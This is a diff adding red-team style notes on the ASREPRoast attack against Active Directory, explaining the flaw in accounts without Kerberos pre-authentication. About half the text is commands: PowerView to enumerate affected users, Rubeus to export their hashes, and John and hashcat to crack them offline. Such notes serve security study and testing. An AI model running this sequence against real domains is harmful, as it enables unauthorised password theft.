@@ -1,0 +1,22 @@
+The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).
+
+That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. 
+This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.
+
+Furthermore, no domain account is needed to perform this attack, only connection to the DC. However, with a domain account, a LDAP query can be used to retrieve users without Kerberos pre-authentication in the domain. Otherwise usernames have to be guessed.
+
+
+#see if the account you disabled appears
+Get-DomainUser -PreauthNotRequired -Verbose
+
+
+---------------------Abuse it---------------
+#Export hash
+.\Rubeus.exe asreproast /format:hashcat /outfile:s4vitar.asreproast
+
+Using bleeding-jumbo branch of John The Ripper, we can brute-force the hashes offline.
+./john s4vitar.asreproast --wordlist=rockyou.txt
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+
+
+
